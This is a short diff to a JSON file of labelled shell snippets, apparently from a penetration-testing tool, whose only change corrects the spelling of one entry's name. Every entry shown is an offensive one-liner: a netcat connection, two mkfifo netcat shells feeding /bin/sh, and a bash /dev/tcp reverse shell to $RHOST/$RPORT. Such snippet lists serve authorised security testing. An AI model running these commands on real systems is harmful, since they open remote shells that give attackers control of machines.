@@ -68,7 +68,7 @@
       "Netcat: Target": "nc $RHOST $RPORT",
       "Reverse Shell: mkfifo #1": "mkfifo /tmp/f; nc -lvnp $LPORT < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f &",
       "Reverse Shell: mkfifo #2": "mkfifo /tmp/f; nc $RHOST $RPORT < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f &",
-      "Reverse Shell: Mordechy": "bash -i >& /dev/tcp/$RHOST/$RPORT 0>&1 &"
+      "Reverse Shell: Mordechai": "bash -i >& /dev/tcp/$RHOST/$RPORT 0>&1 &"
     }
   }
 }
